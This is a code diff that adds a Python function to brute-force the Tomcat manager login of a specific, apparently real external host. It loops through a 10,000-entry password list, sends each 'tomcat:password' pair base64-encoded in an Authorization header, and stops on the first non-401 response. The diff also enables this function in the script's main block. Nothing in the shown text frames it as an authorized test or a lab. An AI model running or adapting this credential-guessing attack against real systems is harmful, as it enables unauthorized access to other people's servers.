@@ -192,10 +192,48 @@ def read_cloud_platform(input_ip):
         return
 
 
+def test_tomcat():
+    import base64
+
+    with open("10k_password.txt", 'r') as temp_file:
+        lines = temp_file.readlines()
+        count = 1
+        for line in lines:
+            temp_str = "tomcat:" + line.strip()
+            byte_str = temp_str.encode("UTF-8")
+            encode_str = base64.b64encode(byte_str)
+            test_str = encode_str.decode("UTF-8")
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) '
+                              'AppleWebKit/537.36 (KHTML, like Gecko) '
+                              'Chrome/92.0.4515.159 '
+                              'Safari/537.36',
+                'Accept-Language': 'zh-TW,zh;'
+                                   'q=0.9,en-US;'
+                                   'q=0.8,en;'
+                                   'q=0.7',
+                'Authorization': test_str
+            }
+            try:
+                temp_request = requests.get("https://dms-care.rightest.com.cn/manager/html", headers=headers)
+                if temp_request.status_code == 401:
+                    print(str(count) + '.' + temp_str + ' (fail)')
+                    count += 1
+                else:
+                    print(str(count) + '.' + temp_str + ' success')
+                    break
+            except Exception as ex:
+                print('Exception:' + str(ex))
+                return {'code': 0, 'text': ''}
+        print('test end')
+
+
+
 # testcase
 if __name__ == '__main__':
-    read_cloud_platform()
+    # read_cloud_platform()
     # read_log4j_software()
+    test_tomcat()
     """
     main_result = read_get("https://www.example.com")
     if main_result['code'] == 200:
